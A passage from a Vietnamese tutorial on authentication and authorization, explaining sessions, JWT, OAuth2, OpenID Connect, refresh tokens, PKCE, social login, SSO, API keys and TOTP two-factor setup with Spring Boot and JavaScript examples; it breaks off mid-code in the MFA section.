# 🔐 Authentication & Authorization — Toàn Tập
>
> Từ khái niệm nền tảng đến OAuth2, JWT, SSO — giải thích trước, code sau

---

## Mục Lục

1. [Authn vs Authz — Hai Khái Niệm Hay Bị Lẫn](#1-authn-vs-authz--hai-khái-niệm-hay-bị-lẫn)
2. [Session-Based Authentication — Cách Cũ](#2-session-based-authentication--cách-cũ)
3. [JWT — Token Tự Chứa Thông Tin](#3-jwt--token-tự-chứa-thông-tin)
4. [OAuth2 — Uỷ Quyền Giữa Các Hệ Thống](#4-oauth2--uỷ-quyền-giữa-các-hệ-thống)
5. [OpenID Connect — OAuth2 Cho Authentication](#5-openid-connect--oauth2-cho-authentication)
6. [Refresh Token — Duy Trì Đăng Nhập](#6-refresh-token--duy-trì-đăng-nhập)
7. [PKCE — Bảo Vệ Cho SPA và Mobile](#7-pkce--bảo-vệ-cho-spa-và-mobile)
8. [Social Login — Đăng Nhập Bằng Google, Facebook](#8-social-login--đăng-nhập-bằng-google-facebook)
9. [SSO — Đăng Nhập Một Lần Dùng Nhiều App](#9-sso--đăng-nhập-một-lần-dùng-nhiều-app)
10. [API Key Authentication](#10-api-key-authentication)
11. [MFA và 2FA — Xác Thực Hai Bước](#11-mfa-và-2fa--xác-thực-hai-bước)
12. [Các Lỗ Hổng Phổ Biến Và Cách Phòng](#12-các-lỗ-hổng-phổ-biến-và-cách-phòng)
13. [Spring Security — Triển Khai Thực Tế](#13-spring-security--triển-khai-thực-tế)
14. [Next.js — Auth Patterns Phổ Biến](#14-nextjs--auth-patterns-phổ-biến)

---

# 1. Authn vs Authz — Hai Khái Niệm Hay Bị Lẫn

Đây là hai câu hỏi hoàn toàn khác nhau mà hệ thống phải trả lời.

**Authentication (Authn)** — "Bạn là ai?"

Hệ thống xác minh danh tính của bạn. Bạn cung cấp bằng chứng (mật khẩu, vân tay, OTP) và hệ thống so sánh với thông tin đã lưu để xác nhận bạn là người bạn nói bạn là.

**Authorization (Authz)** — "Bạn được phép làm gì?"

Sau khi biết bạn là ai, hệ thống quyết định bạn được phép truy cập tài nguyên nào. Nhân viên công ty đều đã xác thực (authn), nhưng chỉ kế toán mới được xem báo cáo tài chính (authz).

```
Ví dụ cụ thể:

Khách sạn:
  Authentication → quầy lễ tân kiểm tra CMND của bạn
  Authorization  → chìa khóa phòng chỉ mở được phòng của bạn,
                   không mở được phòng người khác

Hệ thống ngân hàng:
  Authentication → bạn đăng nhập bằng username + password
  Authorization  → bạn chỉ xem được tài khoản của mình,
                   không xem được của người khác

GitHub:
  Authentication → bạn đăng nhập vào GitHub
  Authorization  → bạn chỉ push được vào repo mà bạn có quyền
```

**Thứ tự luôn là:** Authentication trước → Authorization sau. Hệ thống không thể biết bạn được phép làm gì nếu chưa biết bạn là ai.

---

# 2. Session-Based Authentication — Cách Cũ

Đây là cách web truyền thống xử lý đăng nhập — trước khi JWT ra đời. Vẫn còn dùng phổ biến, đặc biệt cho ứng dụng server-rendered.

## Flow Hoạt Động

```
Bước 1: User gửi username + password
Bước 2: Server kiểm tra, nếu đúng → tạo session, lưu vào database/Redis
Bước 3: Server gửi về Session ID qua cookie
Bước 4: Mỗi request tiếp theo → browser tự gửi cookie kèm theo
Bước 5: Server đọc Session ID từ cookie → tra cứu session store → biết user là ai
```

```
Browser                                     Server
   │                                            │
   │── POST /login {user, pass} ──────────────>│
   │                              Kiểm tra DB   │
   │                              Tạo session   │
   │                              Lưu vào Redis │
   │<── 200 OK + Set-Cookie: sessionId=abc ─────│
   │                                            │
   │── GET /dashboard (Cookie: sessionId=abc) ->│
   │                              Tra Redis     │
   │                              Tìm thấy user │
   │<── 200 OK + Dashboard HTML ───────────────│
```

## Ưu và Nhược Điểm

**Ưu điểm:**

- Đơn giản để hiểu và implement
- Có thể vô hiệu hóa session ngay lập tức (logout thật sự)
- Session store là nguồn sự thật duy nhất

**Nhược điểm:**

- Server phải lưu trữ session — với hàng triệu user, session store trở nên lớn
- Horizontal scaling phức tạp hơn — nếu có nhiều server, request tiếp theo có thể đến server khác không có session
- Phải dùng sticky session hoặc Redis chia sẻ

```
Vấn đề với nhiều server:

Request 1 → Server A → tạo session ở Server A
Request 2 → Server B → không tìm thấy session → yêu cầu đăng nhập lại!

Giải pháp:
Option 1: Sticky session — load balancer luôn route user đến cùng server
          Nhược điểm: nếu server đó die, user mất session
Option 2: Shared session store (Redis) — tất cả server đọc cùng Redis
          Đây là giải pháp phổ biến nhất
```

## Implement Cơ Bản với Spring Boot

```java
// Cấu hình Spring Session với Redis
@Configuration
@EnableRedisHttpSession(maxInactiveIntervalInSeconds = 3600)  // session hết hạn sau 1 giờ
public class SessionConfig {
    // Spring tự lưu session vào Redis
    // Không cần code thêm
}

@RestController
public class AuthController {

    @PostMapping("/login")
    public ResponseEntity<?> login(@RequestBody LoginRequest req,
                                    HttpSession session) {
        User user = userService.authenticate(req.getEmail(), req.getPassword());

        if (user == null) {
            return ResponseEntity.status(401).body("Sai email hoặc mật khẩu");
        }

        // Lưu thông tin user vào session
        session.setAttribute("userId", user.getId());
        session.setAttribute("userRole", user.getRole());

        return ResponseEntity.ok("Đăng nhập thành công");
    }

    @PostMapping("/logout")
    public ResponseEntity<?> logout(HttpSession session) {
        session.invalidate();  // Xóa session ngay lập tức
        return ResponseEntity.ok("Đăng xuất thành công");
    }
}
```

---

# 3. JWT — Token Tự Chứa Thông Tin

JWT (JSON Web Token) ra đời để giải quyết vấn đề session với nhiều server. Thay vì server lưu trạng thái, token chứa đủ thông tin và được ký bằng chữ ký số.

## Cấu Trúc Của JWT

JWT gồm 3 phần ngăn cách bằng dấu chấm: `header.payload.signature`

```
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjEyM30.xyz123abc
     ↑ Header            ↑ Payload          ↑ Signature
```

Ba phần đều được encode bằng Base64URL — không phải mã hóa, chỉ là encode. Nghĩa là ai cũng có thể đọc header và payload nếu có token. Đừng đặt mật khẩu hay thông tin nhạy cảm vào payload.

```json
// Header — khai báo thuật toán ký
{
  "alg": "HS256",
  "typ": "JWT"
}

// Payload — thông tin về user (claims)
{
  "sub": "user_123",           // subject — thường là userId
  "email": "khang@example.com",
  "role": "ADMIN",
  "iat": 1700000000,           // issued at — thời điểm tạo (Unix timestamp)
  "exp": 1700003600            // expires — thời điểm hết hạn
}

// Signature — chữ ký để verify
// Được tính từ: HMAC_SHA256(base64(header) + "." + base64(payload), secret_key)
```

## Tại Sao Signature Quan Trọng

Signature được tạo bằng cách kết hợp header + payload với **secret key** chỉ server biết. Bất kỳ ai thay đổi payload (ví dụ đổi role từ USER thành ADMIN) sẽ làm signature không khớp. Server verify bằng cách tính lại signature và so sánh.

```
User nhận token: eyJ...header...eyJ...payload(role=USER)...signature_A

User xấu thay đổi payload: eyJ...header...eyJ...payload(role=ADMIN)...signature_A
Server verify:  Tính lại signature từ header + payload mới → signature_B
                signature_A ≠ signature_B → REJECTED!

→ Không thể giả mạo token nếu không có secret key
```

## Stateless — Không Cần Session Store

```
Session-based:
  Client gửi session ID → Server tra Redis → lấy user info

JWT:
  Client gửi token → Server verify signature → đọc user info từ token
  → Không cần tra bất kỳ database hay Redis nào!
  → Mỗi server đều có thể verify độc lập
```

## Flow JWT

```
Bước 1: User đăng nhập → Server kiểm tra → tạo JWT (ký bằng secret)
Bước 2: Trả JWT về cho client
Bước 3: Client lưu token (localStorage hoặc memory)
Bước 4: Mỗi request tiếp theo → gửi token trong Authorization header
Bước 5: Server verify signature → đọc payload → biết user là ai

Header: Authorization: Bearer eyJhbGci...
```

```java
// Tạo JWT với io.jsonwebtoken (jjwt)
@Service
public class JwtService {

    @Value("${jwt.secret}")
    private String secret;

    @Value("${jwt.expiration:3600000}")  // 1 giờ tính bằng milliseconds
    private long expiration;

    public String generateToken(User user) {
        Date now = new Date();
        Date expiryDate = new Date(now.getTime() + expiration);

        return Jwts.builder()
            .subject(user.getId().toString())       // sub claim
            .claim("email", user.getEmail())
            .claim("role", user.getRole().name())
            .issuedAt(now)                          // iat claim
            .expiration(expiryDate)                 // exp claim
            .signWith(getSigningKey())              // ký với secret
            .compact();
    }

    public Claims extractClaims(String token) {
        return Jwts.parser()
            .verifyWith(getSigningKey())
            .build()
            .parseSignedClaims(token)
            .getPayload();
    }

    public boolean isTokenValid(String token) {
        try {
            Claims claims = extractClaims(token);
            return !claims.getExpiration().before(new Date());
        } catch (JwtException e) {
            return false;  // Token bị giả mạo, hết hạn, hoặc không hợp lệ
        }
    }

    private SecretKey getSigningKey() {
        byte[] keyBytes = Decoders.BASE64.decode(secret);
        return Keys.hmacShaKeyFor(keyBytes);
    }
}
```

## Nhược Điểm Của JWT

**Không thể thu hồi token trước khi hết hạn.** Đây là vấn đề lớn nhất.

```
Tình huống:
  User A đăng nhập → nhận JWT có hạn 1 giờ
  Admin phát hiện tài khoản A bị hack → muốn logout ngay lập tức
  → Không thể! Token vẫn hợp lệ cho đến khi hết hạn

  Hoặc: user đổi mật khẩu → token cũ vẫn còn hiệu lực

Giải pháp thường dùng:
  Token expiration ngắn (15-30 phút)
  Refresh token để lấy access token mới
  Denfrom token blacklist (nhưng như vậy lại cần stateful storage)
```

---

# 4. OAuth2 — Uỷ Quyền Giữa Các Hệ Thống

OAuth2 **không phải** là protocol cho authentication. Nó là protocol cho **authorization** — cho phép một ứng dụng truy cập tài nguyên trên dịch vụ khác thay mặt cho user, mà không cần user chia sẻ mật khẩu.

## Ví Dụ Thực Tế Để Hiểu Rõ

Bạn dùng app Canva và muốn import ảnh từ Google Photos.

```
Vấn đề: Canva cần quyền đọc Google Photos của bạn
Giải pháp tệ: bạn đưa mật khẩu Google cho Canva
  → Canva có thể đọc email, Drive, YouTube... tất cả mọi thứ!
  → Không thể thu hồi chỉ quyền của Canva mà không đổi mật khẩu

Giải pháp OAuth2: bạn cho phép Canva quyền ĐỌC PHOTOS mà thôi
  → Canva không bao giờ biết mật khẩu Google của bạn
  → Google kiểm soát việc cấp quyền
  → Bạn có thể thu hồi quyền của Canva bất kỳ lúc nào
```

## 4 Nhân Vật Trong OAuth2

```
Resource Owner   → Bạn (người sở hữu tài nguyên — Google Photos)
Client           → Canva (ứng dụng muốn truy cập tài nguyên)
Authorization Server → Google Accounts (cấp phép, quản lý token)
Resource Server  → Google Photos API (nơi chứa tài nguyên)

Trong thực tế, Authorization Server và Resource Server
thường do cùng một công ty vận hành (đều là Google)
```

## Authorization Code Flow — Flow An Toàn Nhất

Đây là flow phổ biến nhất, dùng cho web apps chạy trên server.

```
1. User click "Kết nối Google Photos" trong Canva

2. Canva redirect user đến Google:
   https://accounts.google.com/oauth/authorize
     ?client_id=canva_client_id
     &redirect_uri=https://canva.com/oauth/callback
     &scope=photos.readonly
     &response_type=code
     &state=random_string_chong_csrf

3. Google hiển thị màn hình consent:
   "Canva muốn: Đọc Google Photos của bạn"
   User click "Cho phép"

4. Google redirect về Canva kèm authorization code:
   https://canva.com/oauth/callback?code=ABCDEF&state=random_string

5. Canva (server-side) gửi code đến Google để đổi lấy token:
   POST https://accounts.google.com/oauth/token
     code=ABCDEF
     client_id=canva_client_id
     client_secret=canva_secret        ← secret này user không biết!
     redirect_uri=https://canva.com/oauth/callback
     grant_type=authorization_code

6. Google trả về access token (và refresh token)

7. Canva dùng access token để gọi Google Photos API:
   GET https://photoslibrary.googleapis.com/v1/albums
   Authorization: Bearer access_token
```

## Tại Sao Phải Có Bước "Authorization Code" Thay Vì Token Trực Tiếp?

Đây là câu hỏi hay. Tại sao Google không trả token thẳng ở bước 4?

```
Nếu trả token thẳng qua URL redirect:
  URL xuất hiện trong browser history
  URL xuất hiện trong server logs
  URL có thể bị sniff

Code được thiết kế chỉ dùng được MỘT LẦN và hết hạn nhanh
Đổi code → token xảy ra từ server-to-server (không qua browser)
→ client_secret không bao giờ lộ ra phía user
→ Token chỉ tồn tại trong bộ nhớ server của Canva
```

## State Parameter — Chống CSRF

`state` là random string được Canva tạo ra và gửi đến Google. Khi Google redirect về, Canva kiểm tra `state` trong response có khớp với `state` đã tạo không.

```
Nếu không có state:
  Attacker tạo một authorization request
  Gửi callback URL (với code của attacker) cho nạn nhân
  Nạn nhân click → link tài khoản của nạn nhân với tài khoản của attacker!

State ngăn điều này: Canva kiểm tra state khớp
→ Request phải bắt đầu từ Canva, không phải từ đâu đó khác
```

## OAuth2 Scopes — Kiểm Soát Quyền Truy Cập

Scope xác định chính xác quyền gì được cấp.

```
photos.readonly      → chỉ đọc ảnh
photos.readwrite     → đọc và ghi ảnh
drive.readonly       → chỉ đọc Drive
drive.appfolder      → chỉ truy cập folder của app trong Drive
email                → đọc địa chỉ email
profile              → đọc thông tin profile cơ bản

User thấy danh sách scope trên màn hình consent
→ Biết chính xác mình đang cho phép gì
```

## Các OAuth2 Grant Types

```
Authorization Code:
  Dùng cho web app trên server
  Có bước đổi code → token trên server
  An toàn nhất

Authorization Code + PKCE:
  Dùng cho SPA và mobile app (không có server secret)
  Sẽ giải thích ở Section 7

Client Credentials:
  Dùng cho machine-to-machine (không có user)
  Service A gọi Service B dùng grant type này
  Không có user trong flow
  POST /token → client_id + client_secret → access_token

Resource Owner Password Credentials (DEPRECATED):
  User đưa mật khẩu thẳng cho client
  Nguy hiểm — không dùng nữa
  Chỉ thấy trong hệ thống cũ

Device Code:
  Dùng cho thiết bị không có trình duyệt (TV, CLI)
  Thiết bị hiển thị URL và code
  User mở URL trên điện thoại, nhập code → xác nhận
```

---

# 5. OpenID Connect — OAuth2 Cho Authentication

Ở phần trên đã nói OAuth2 là về **authorization**, không phải authentication. Vậy khi bạn click "Đăng nhập bằng Google", Google dùng gì?

Câu trả lời là **OpenID Connect (OIDC)** — một lớp authentication xây dựng trên OAuth2.

## OAuth2 Chỉ Nói "Bạn Được Phép Làm Gì", Không Nói "Bạn Là Ai"

```
OAuth2 thuần túy:
  Client nhận access token
  Dùng token để gọi Resource Server
  Resource Server trả về data

Nhưng: client không biết token này là của ai!
  Phải gọi thêm /userinfo endpoint để hỏi "token này thuộc về user nào?"
  → Không chuẩn, mỗi provider implement khác nhau
```

## OIDC Thêm ID Token

OIDC thêm vào OAuth2 một thứ gọi là **ID Token** — JWT chứa thông tin về người dùng.

```
OAuth2 response: { "access_token": "...", "token_type": "bearer" }

OIDC response: {
  "access_token": "...",     ← dùng để gọi API
  "id_token": "eyJ...",      ← JWT chứa thông tin user (mới!)
  "token_type": "bearer"
}

ID Token payload:
{
  "iss": "https://accounts.google.com",  // ai phát hành
  "sub": "10769150350006150715113082367", // Google user ID (duy nhất, ổn định)
  "email": "khang@gmail.com",
  "name": "Nguyen Khang",
  "picture": "https://...",
  "iat": 1700000000,
  "exp": 1700003600
}
```

Bây giờ client không cần gọi thêm API nào — đọc ID Token là biết ngay user là ai.

## Scope openid

Để nhận ID Token, client phải thêm scope `openid` vào request.

```
scope=openid                  → chỉ có ID Token, thông tin cơ bản (sub)
scope=openid profile          → thêm name, picture, locale
scope=openid profile email    → thêm email, email_verified
scope=openid profile email phone → thêm phone_number
```

## Tại Sao Phân Biệt access_token Và id_token?

```
access_token:
  Dùng để gọi Resource Server API
  Resource Server chấp nhận
  Format không chuẩn (mỗi provider khác nhau, có thể là opaque string)

id_token:
  Dùng cho client biết user là ai
  Phải là JWT (chuẩn OIDC)
  Client decode và đọc thông tin
  KHÔNG gửi id_token lên Resource Server
```

---

# 6. Refresh Token — Duy Trì Đăng Nhập

Đã nói ở phần JWT: access token có thời hạn ngắn (15-30 phút) để giảm rủi ro nếu bị lộ. Nhưng user không muốn đăng nhập lại mỗi 30 phút.

Refresh token giải quyết vấn đề này.

## Cách Hoạt Động

```
1. User đăng nhập → nhận hai token:
   access_token: hết hạn sau 15 phút
   refresh_token: hết hạn sau 7 ngày (hoặc 30 ngày)

2. Client dùng access_token để gọi API (trong 15 phút)

3. Access token hết hạn → API trả về 401

4. Client tự động gửi refresh_token đến /auth/refresh:
   POST /auth/refresh
   { "refresh_token": "..." }

5. Server kiểm tra refresh_token → trả về access_token mới
   (refresh_token mới cũng được trả về — rotation)

6. Client dùng access_token mới, user không hề biết
```

## Refresh Token Rotation

Mỗi lần dùng refresh token, server trả về refresh token mới và vô hiệu hóa cái cũ.

```
Tại sao? Nếu refresh_token bị đánh cắp:
  Không có rotation: attacker dùng hoài token đó
  Có rotation:
    Attacker dùng refresh_token cũ → nhận refresh_token mới
    User dùng refresh_token cũ → BỊ TỪ CHỐI (đã rotation)
    → Server phát hiện có ai đó dùng token đã bị dùng rồi
    → Thu hồi tất cả token của user → user phải đăng nhập lại
    → Attacker cũng mất quyền truy cập
```

## Lưu Token Ở Đâu?

Đây là câu hỏi security quan trọng, đặc biệt với SPA (React, Next.js).

```
localStorage:
  Ưu điểm: đơn giản, persist qua tab
  Nhược điểm: XSS attack có thể đọc được!
  JavaScript bất kỳ trên trang có thể đọc localStorage
  → Nếu có XSS, attacker lấy được token → chiếm quyền

Cookie với HttpOnly:
  Ưu điểm: JavaScript KHÔNG THỂ đọc HttpOnly cookie
  Browser tự gửi cookie mỗi request
  → XSS không lấy được token
  Nhược điểm: dễ bị CSRF (nhưng có cách phòng)

Memory (trong RAM của app):
  Ưu điểm: XSS không truy cập được
  Nhược điểm: mất khi user refresh trang, không persist qua tab

Khuyến nghị:
  Access token:  Memory (biến JavaScript) — ngắn hạn, không cần persist
  Refresh token: HttpOnly Secure SameSite cookie
  → XSS không lấy được access token (trong memory)
  → Refresh token an toàn trong HttpOnly cookie
```

```java
// Server: set refresh token vào HttpOnly cookie
@PostMapping("/auth/refresh")
public ResponseEntity<?> refresh(
        @CookieValue("refresh_token") String refreshToken,
        HttpServletResponse response) {

    TokenPair tokens = authService.refresh(refreshToken);

    // Access token trong body (client lưu trong memory)
    // Refresh token trong HttpOnly cookie
    ResponseCookie cookie = ResponseCookie.from("refresh_token", tokens.getRefreshToken())
        .httpOnly(true)     // JavaScript không đọc được
        .secure(true)       // chỉ gửi qua HTTPS
        .sameSite("Strict") // chống CSRF
        .maxAge(7 * 24 * 3600)  // 7 ngày
        .path("/auth")      // chỉ gửi đến /auth endpoints
        .build();

    response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());

    return ResponseEntity.ok(new AccessTokenResponse(tokens.getAccessToken()));
}
```

---

# 7. PKCE — Bảo Vệ Cho SPA và Mobile

PKCE (Proof Key for Code Exchange) — đọc là "pixie".

## Vấn Đề Với SPA và Mobile

Trong Authorization Code flow chuẩn, có bước client gửi `client_secret` để đổi code lấy token. Với web app trên server, secret này an toàn vì người dùng không thấy.

Nhưng SPA (React app) chạy hoàn toàn trong browser, và mobile app chạy trên thiết bị của user. Không thể giữ bí mật `client_secret` — ai cũng có thể mở DevTools hay decompile app để xem.

```
Mobile app không có client_secret an toàn
→ Attacker có thể impersonate app
→ Nhận authorization code từ redirect URI
→ Đổi code lấy token
→ Chiếm quyền truy cập!
```

## PKCE Giải Quyết Thế Nào

Thay vì dùng static `client_secret`, PKCE tạo ra một cặp giá trị động cho mỗi authorization request.

```
Bước 1: Trước khi bắt đầu flow, app tạo:
  code_verifier = random string dài 43-128 ký tự
  code_challenge = BASE64URL(SHA256(code_verifier))

  Ví dụ:
  code_verifier = "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"
  code_challenge = "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM"

Bước 2: Gửi code_challenge đến Authorization Server (thay vì client_secret)
  GET /authorize
    ?client_id=app_id
    &code_challenge=E9Mel...
    &code_challenge_method=S256    ← dùng SHA256
    &response_type=code

Bước 3: Sau khi nhận code, đổi code lấy token — gửi code_verifier:
  POST /token
    code=AUTH_CODE
    code_verifier=dBjftJeZ...     ← thay vì client_secret

Bước 4: Authorization Server verify:
  SHA256(code_verifier) == code_challenge?
  Nếu đúng → trả token
  Nếu sai → từ chối
```

```
Tại sao an toàn?

Attacker có thể intercept authorization code
Nhưng attacker không có code_verifier (được tạo trong app, không gửi qua network)
SHA256 là one-way — không thể tính ngược từ code_challenge
→ Attacker không thể đổi code lấy token!
```

```javascript
// Implement PKCE trong JavaScript (browser)
async function generatePKCE() {
  // Tạo code_verifier ngẫu nhiên
  const array = new Uint8Array(32)
  window.crypto.getRandomValues(array)
  const codeVerifier = btoa(String.fromCharCode.apply(null, array))
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=/g, '')

  // Tạo code_challenge = SHA256(verifier)
  const encoder = new TextEncoder()
  const data = encoder.encode(codeVerifier)
  const digest = await window.crypto.subtle.digest('SHA-256', data)
  const codeChallenge = btoa(String.fromCharCode.apply(null, new Uint8Array(digest)))
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=/g, '')

  // Lưu verifier vào sessionStorage (sẽ dùng ở bước đổi code)
  sessionStorage.setItem('code_verifier', codeVerifier)

  return { codeVerifier, codeChallenge }
}

async function startLogin() {
  const { codeChallenge } = await generatePKCE()
  const state = generateRandomString()
  sessionStorage.setItem('oauth_state', state)

  const authUrl = new URL('https://accounts.google.com/oauth/authorize')
  authUrl.searchParams.set('client_id', 'YOUR_CLIENT_ID')
  authUrl.searchParams.set('redirect_uri', 'http://localhost:3000/callback')
  authUrl.searchParams.set('scope', 'openid profile email')
  authUrl.searchParams.set('response_type', 'code')
  authUrl.searchParams.set('code_challenge', codeChallenge)
  authUrl.searchParams.set('code_challenge_method', 'S256')
  authUrl.searchParams.set('state', state)

  window.location.href = authUrl.toString()
}
```

---

# 8. Social Login — Đăng Nhập Bằng Google, Facebook

"Đăng nhập bằng Google" là ứng dụng của OIDC (OpenID Connect). Người dùng không cần tạo tài khoản mới — dùng danh tính từ Google.

## Flow Đầy Đủ

```
1. User click "Đăng nhập bằng Google" trên app của bạn

2. App redirect đến Google (Authorization Code + PKCE):
   https://accounts.google.com/oauth/authorize
     ?client_id=YOUR_APP_CLIENT_ID
     &redirect_uri=https://yourapp.com/auth/callback
     &scope=openid profile email
     &response_type=code
     &state=...
     &code_challenge=...

3. Google hiển thị màn hình chọn tài khoản
   User chọn tài khoản và đồng ý

4. Google redirect về:
   https://yourapp.com/auth/callback?code=ABCDEF&state=...

5. App server đổi code lấy token:
   POST https://oauth2.googleapis.com/token
     code=ABCDEF
     client_id=...
     client_secret=...   (hoặc code_verifier nếu dùng PKCE)
     redirect_uri=...
     grant_type=authorization_code

6. Google trả về:
   {
     "access_token": "...",     ← dùng để gọi Google API
     "id_token": "eyJ...",      ← JWT chứa thông tin user
     "refresh_token": "..."
   }

7. App đọc id_token, lấy thông tin user:
   {
     "sub": "10769150350006150715113082367",  // Google ID, ổn định, unique
     "email": "khang@gmail.com",
     "name": "Nguyen Khang",
     "picture": "https://..."
   }

8. App tìm user trong database theo email hoặc google_id:
   - Nếu tìm thấy → đăng nhập
   - Nếu không tìm thấy → tạo tài khoản mới, lưu google_id

9. App tạo session hoặc JWT của riêng mình → trả về cho user
```

## Lưu Ý Quan Trọng

**Dùng `sub` (Google User ID) làm identifier, không phải email.**

Email có thể thay đổi. `sub` là ID ổn định, không bao giờ đổi ngay cả khi user đổi email Google.

```java
@Service
public class GoogleAuthService {

    public User processGoogleLogin(String idToken) {
        // Verify id_token với Google
        GoogleIdToken.Payload payload = googleIdTokenVerifier.verify(idToken);

        String googleId = payload.getSubject();     // sub — dùng cái này!
        String email = payload.getEmail();
        String name = (String) payload.get("name");
        String picture = (String) payload.get("picture");

        // Tìm user theo googleId (không phải email)
        return userRepository.findByGoogleId(googleId)
            .orElseGet(() -> {
                // Tạo tài khoản mới
                User newUser = new User();
                newUser.setGoogleId(googleId);
                newUser.setEmail(email);
                newUser.setName(name);
                newUser.setAvatarUrl(picture);
                return userRepository.save(newUser);
            });
    }
}
```

---

# 9. SSO — Đăng Nhập Một Lần Dùng Nhiều App

SSO (Single Sign-On) cho phép user đăng nhập một lần và truy cập nhiều ứng dụng khác nhau mà không cần đăng nhập lại.

## Ví Dụ Thực Tế

```
Bạn đăng nhập Google một lần
→ Vào Gmail — đã đăng nhập
→ Vào Google Drive — đã đăng nhập
→ Vào Google Calendar — đã đăng nhập
→ Vào YouTube — đã đăng nhập
Không cần nhập mật khẩu lại!

Trong môi trường doanh nghiệp:
  Nhân viên đăng nhập Active Directory một lần
  → Dùng được: email (Outlook), chat (Teams), HR system, ERP, ...
  → Không cần nhớ nhiều mật khẩu
```

## Cách SSO Hoạt Động với OIDC

```
Identity Provider (IdP) — nguồn sự thật về danh tính:
  Google, Microsoft, Okta, Auth0, Keycloak

Service Providers (SP) — các app tin tưởng IdP:
  App A, App B, App C đều tin tưởng IdP

Flow:
  1. User vào App A → chưa đăng nhập
  2. App A redirect đến IdP
  3. User chưa có session với IdP → phải đăng nhập
  4. Sau khi đăng nhập → IdP tạo SSO session (cookie tại IdP)
  5. IdP redirect về App A kèm token → App A đăng nhập user

  Sau đó:
  6. User vào App B → chưa đăng nhập
  7. App B redirect đến IdP
  8. IdP kiểm tra → đã có SSO session! (cookie còn đó)
  9. Không cần nhập mật khẩu lại
  10. IdP redirect về App B kèm token → App B đăng nhập user
```

## Keycloak — IdP Self-Hosted Phổ Biến

```yaml
# docker-compose.yml
version: '3'
services:
  keycloak:
    image: quay.io/keycloak/keycloak:latest
    command: start-dev
    environment:
      KEYCLOAK_ADMIN: admin
      KEYCLOAK_ADMIN_PASSWORD: admin
    ports:
      - "8180:8080"
```

```yaml
# application.yml — Spring Boot app dùng Keycloak làm IdP
spring:
  security:
    oauth2:
      client:
        registration:
          keycloak:
            client-id: my-app
            client-secret: my-secret
            scope: openid,profile,email
            authorization-grant-type: authorization_code
        provider:
          keycloak:
            issuer-uri: http://localhost:8180/realms/myrealm
```

---

# 10. API Key Authentication

API Key là chuỗi token đơn giản, thường dùng cho machine-to-machine API calls — không có user trong flow.

## Khi Nào Dùng API Key

```
Phù hợp:
  Third-party developer tích hợp API của bạn
  Service-to-service internal calls
  CI/CD pipelines gọi API
  CLI tools

Không phù hợp:
  User đăng nhập (dùng OAuth2 + JWT)
  Cần revoke từng user session
  Cần biết role/permission phức tạp
```

## Thiết Kế API Key An Toàn

```
Format nên dùng: prefix_randomstring
Ví dụ: sk_live_abcdef123456789...

Tại sao có prefix?
  "sk_live_" → secret key, production
  "sk_test_" → secret key, testing
  "pk_live_" → publishable key, production
  User nhìn vào log thấy ngay đây là loại key gì
  Dễ filter trong code: if (key.startsWith('sk_test_'))...
  Giảm nguy cơ dùng nhầm production key trong test

Stripe dùng cách này: sk_live_..., pk_live_..., sk_test_..., pk_test_...
```

```java
@Service
public class ApiKeyService {

    public ApiKey generateApiKey(String userId, String name) {
        // Tạo key ngẫu nhiên 32 bytes → 44 ký tự base64url
        byte[] randomBytes = new byte[32];
        secureRandom.nextBytes(randomBytes);
        String rawKey = "sk_live_" + Base64.getUrlEncoder()
            .withoutPadding().encodeToString(randomBytes);

        // Lưu vào DB: KHÔNG lưu raw key, chỉ lưu hash
        // Nếu DB bị lộ, attacker không có raw key
        String hashedKey = sha256Hash(rawKey);

        ApiKey apiKey = new ApiKey();
        apiKey.setUserId(userId);
        apiKey.setName(name);
        apiKey.setKeyHash(hashedKey);
        apiKey.setKeyPrefix(rawKey.substring(0, 10));  // lưu prefix để user nhận ra
        apiKey.setCreatedAt(Instant.now());
        apiKeyRepository.save(apiKey);

        // Trả raw key cho user MỘT LẦN DUY NHẤT — sau đó không thể recover!
        return new ApiKeyResponse(rawKey, apiKey.getId());
    }

    public Optional<User> validateApiKey(String rawKey) {
        String hashedKey = sha256Hash(rawKey);
        return apiKeyRepository.findByKeyHash(hashedKey)
            .map(key -> userRepository.findById(key.getUserId()))
            .flatMap(u -> u);
    }
}

// Filter kiểm tra API key
@Component
public class ApiKeyFilter extends OncePerRequestFilter {

    @Override
    protected void doFilterInternal(HttpServletRequest req,
                                     HttpServletResponse res,
                                     FilterChain chain) throws Exception {
        String apiKey = req.getHeader("X-API-Key");

        if (apiKey != null) {
            apiKeyService.validateApiKey(apiKey).ifPresent(user -> {
                UsernamePasswordAuthenticationToken auth =
                    new UsernamePasswordAuthenticationToken(user, null, user.getAuthorities());
                SecurityContextHolder.getContext().setAuthentication(auth);
            });
        }

        chain.doFilter(req, res);
    }
}
```

---

# 11. MFA và 2FA — Xác Thực Hai Bước

MFA (Multi-Factor Authentication) yêu cầu nhiều hơn một "yếu tố" để xác thực.

## Ba Loại Yếu Tố

```
Something you KNOW (bạn biết):
  Mật khẩu, PIN, câu hỏi bí mật

Something you HAVE (bạn có):
  Điện thoại (OTP app), USB security key, thẻ ngân hàng

Something you ARE (bạn là):
  Vân tay, khuôn mặt, giọng nói (biometric)

MFA = dùng ≥ 2 yếu tố khác loại
2FA = dùng đúng 2 yếu tố

Mật khẩu + OTP app = 2FA (know + have)
Mật khẩu + SMS = 2FA (know + have) — nhưng SMS kém an toàn hơn!
```

## TOTP — Time-based OTP (Google Authenticator)

TOTP (Time-based One-Time Password) tạo mã 6 số thay đổi mỗi 30 giây. Google Authenticator, Authy đều dùng chuẩn này.

```
Cách hoạt động:
  1. Khi bật 2FA: server tạo secret key
  2. Server hiển thị QR code chứa secret
  3. User quét bằng authenticator app
  4. App và server cùng biết secret key

  Mỗi lần login:
  App tính: HMAC-SHA1(secret, floor(currentTime / 30))
  → Kết quả 6 chữ số
  Server tính cùng công thức → so sánh
  → Không cần gửi gì qua network!
  → Secret không bao giờ di chuyển sau lần setup ban đầu
```

```java
@Service
public class TotpService {

    // Tạo secret cho user khi bật 2FA
    public TotpSetup setupTotp(User user) {
        // Tạo secret 160-bit (20 bytes)
        GoogleAuthenticator gAuth = new GoogleAuthenticator();
        GoogleAuthenticatorKey key = gAuth.createCredentials();

        // Lưu secret vào DB (encrypted!)
        user.setTotpSecret(encrypt(key.getKey()));
